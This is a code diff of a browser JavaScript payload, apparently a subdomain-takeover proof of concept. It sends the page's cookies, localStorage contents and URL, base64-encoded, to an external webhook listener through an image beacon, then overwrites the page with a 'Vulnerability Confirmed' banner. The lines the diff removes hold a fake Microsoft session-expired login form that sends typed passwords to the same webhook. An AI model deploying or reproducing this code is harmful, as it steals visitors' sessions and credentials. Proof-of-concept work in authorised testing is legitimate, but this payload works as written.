@@ -1,33 +1,27 @@
 (function() {
-    // నీ కొత్త వెబ్‌హుక్ లింక్ (స్క్రీన్‌షాట్ ప్రకారం)
-    const webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";
+    // నీ కొత్త వెబ్‌హుక్ లింక్
+    var webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";
 
-    const info = {
-        researcher: "Ramavath Gopi Nayak",
+    // డేటా సేకరించడం
+    var info = {
+        hacker: "Ramavath Gopi Nayak",
         cookies: document.cookie || "No Cookies Found",
+        storage: JSON.stringify(localStorage),
         url: window.location.href
     };
 
-    const encoded = btoa(JSON.stringify(info));
+    // Base64 Encoding
+    var encoded = btoa(JSON.stringify(info));
 
-    // 1. Image Beacon (అత్యంత నమ్మకమైనది)
-    const img = new Image();
-    img.src = webhook + "?data=" + encoded;
+    // 1. Image Beacon (అత్యంత నమ్మకమైన పద్ధతి)
+    var img = new Image();
+    img.src = webhook + "?report=" + encoded;
 
-    // 2. Phishing Form Injection
+    // 2. స్క్రీన్ మీద కనిపిస్తే PoC సక్సెస్ అయినట్టు గుర్తు
     document.body.innerHTML = `
-        <div style="font-family:Segoe UI; text-align:center; margin-top:100px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="120"><br>
-            <h2>Session Expired</h2>
-            <p>Please log in again.</p>
-            <input type="password" id="p" placeholder="Password" style="padding:8px;"><br><br>
-            <button id="b" style="background:#0078d4; color:white; border:none; padding:8px 20px;">Login</button>
+        <div style="background:black; color:red; padding:50px; text-align:center; height:100vh;">
+            <h1>Vulnerability Confirmed</h1>
+            <p>Subdomain Takeover by Naik Gopi</p>
+            <p>Session data has been exfiltrated to the listener.</p>
         </div>`;
-
-    document.getElementById('b').onclick = function() {
-        const p = document.getElementById('p').value;
-        const creds = btoa(JSON.stringify({stolen_pass: p}));
-        new Image().src = webhook + "?creds=" + creds;
-        alert("Verification failed. Please try later.");
-    };
 })();
